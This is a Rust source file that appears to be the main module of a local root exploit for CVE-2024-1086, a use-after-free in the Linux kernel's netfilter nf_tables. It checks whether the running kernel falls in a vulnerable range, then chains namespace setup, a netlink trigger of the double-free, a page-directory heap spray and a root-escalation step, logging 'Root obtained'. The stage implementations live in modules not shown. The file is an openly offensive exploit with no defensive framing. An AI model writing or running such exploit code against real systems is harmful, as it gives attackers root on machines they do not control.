//! CVE-2024-1086: Netfilter nf_tables Use-After-Free

mod netlink;
mod nftables;
mod trigger;
mod spray;
mod escalate;

use log::{info, error};

pub struct Exploit {
    kernel: (u32, u32, u32),
}

impl Exploit {
    pub fn new() -> Self {
        Self { kernel: Self::get_kernel_version() }
    }

    fn get_kernel_version() -> (u32, u32, u32) {
        let mut u: libc::utsname = unsafe { std::mem::zeroed() };
        unsafe { libc::uname(&mut u) };
        
        let r = unsafe { std::ffi::CStr::from_ptr(u.release.as_ptr()) }
            .to_str().unwrap_or("0.0.0");
        
        let p: Vec<u32> = r.split(|c: char| !c.is_ascii_digit())
            .take(3)
            .filter_map(|s| s.parse().ok())
            .collect();
        
        (p.get(0).copied().unwrap_or(0), 
         p.get(1).copied().unwrap_or(0), 
         p.get(2).copied().unwrap_or(0))
    }

    fn is_vulnerable(&self) -> bool {
        let (maj, min, _) = self.kernel;
        (maj == 5 && min >= 14) || (maj == 6 && min <= 6)
    }

    pub fn run(&self) -> Result<(), String> {
        info!("[CVE-2024-1086] Kernel {}.{}.{}", self.kernel.0, self.kernel.1, self.kernel.2);

        if !self.is_vulnerable() {
            return Err(format!("Not vulnerable (need 5.14-6.6, have {}.{})", 
                self.kernel.0, self.kernel.1));
        }

        info!("[1/5] Namespace setup");
        let _ns = trigger::NamespaceContext::new()?;

        info!("[2/5] Netlink socket");
        let mut sock = netlink::NetlinkSocket::new()?;
        let batch = nftables::ExploitBatch::new(&sock)?;

        info!("[3/5] Trigger double-free");
        trigger::execute_trigger(&mut sock, &batch)?;

        info!("[4/5] Heap spray");
        let phys = spray::DirtyPagedirectory::spray()?;

        info!("[5/5] Escalate");
        escalate::gain_root(&phys)?;

        info!("[CVE-2024-1086] Root obtained");
        Ok(())
    }
}
